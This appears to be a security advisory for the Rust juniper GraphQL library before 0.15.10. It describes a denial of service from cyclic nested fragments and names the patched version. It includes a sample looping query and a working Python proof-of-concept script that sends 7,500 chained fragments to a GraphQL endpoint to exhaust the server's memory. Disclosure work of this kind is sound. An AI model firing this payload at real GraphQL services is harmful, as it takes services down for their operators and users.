## Package

cargo

juniper
([Rust](/advisories?query=ecosystem%3Arust))

## Affected versions

< 0.15.10

## Patched versions

0.15.10

## Description

### GraphQL behaviour

Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.

Some language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.

```
# Infinite loop example
query {
    ...a
}

fragment a on Query {
    ...b
}

fragment b on Query {
    ...a
}
```
### POC TLDR

With max\_size being the number of nested fragment generated.

At max\_size=7500, it should instantly raise:

However, with a lower size, you will overflow the memory after some iterations.

### Reproduction steps (Juniper)

```
git clone https://github.com/graphql-rust/juniper.git
cd juniper

```

Save this POC as poc.py

```
import requests
import time
import json
from itertools import permutations

print('=== Fragments POC ===')

url = 'http://localhost:8080/graphql'

max_size = 7500
perms = [''.join(p) for p in permutations('abcefghijk')]
perms = perms[:max_size]

fragment_payloads = ''
for i, perm in enumerate(perms):
    next_perm = perms[i+1] if i < max_size-1 else perms[0]
    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'

payload = {'query':'query{\n  ...' + perms[0] + '\n}' + fragment_payloads,'variables':{},'operationName':None}

headers = {
  'Content-Type': 'application/json',
}

try:
    response = requests.request('POST', url, headers=headers, json=payload)
    print(response.text)
except requests.exceptions.ConnectionError:
    print('Connection closed, POC worked.')
```
```
cargo run
[in separate shell] python3 poc.py

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
